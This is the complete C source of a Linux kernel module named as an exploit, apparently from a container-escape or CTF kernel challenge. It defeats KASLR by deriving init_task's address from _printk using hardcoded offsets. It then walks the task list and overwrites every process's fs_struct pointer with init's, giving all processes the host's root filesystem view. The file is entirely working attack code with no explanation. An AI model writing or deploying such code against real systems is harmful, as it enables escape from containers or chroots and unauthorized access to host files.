#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/sched/task.h>
#include <linux/fs_struct.h>

static int __init exploit_start(void)
{
  struct task_struct *task;
  struct task_struct *_init_task;
  long nokaslr_init_task = 0xffffffff81e12600;
  long nokaslr_printk = 0xffffffff8165aa26;
  _init_task = (void*)_printk - nokaslr_printk + nokaslr_init_task;
  task = _init_task;
  while (1) {
    // task->fs = init_task->fs;
    *(void**)((void*)task + 0x5a8) = *(void**)((void*)_init_task + 0x5a8);
    // next task
    task = (*(void**)((void*)task + 0x2d0)) - 0x2d0;
    if (task == _init_task) {
      break;
    }
  }
	return 0;
}

static void __exit exploit_end(void)
{
}

module_init(exploit_start);
module_exit(exploit_end);
MODULE_LICENSE("GPL");
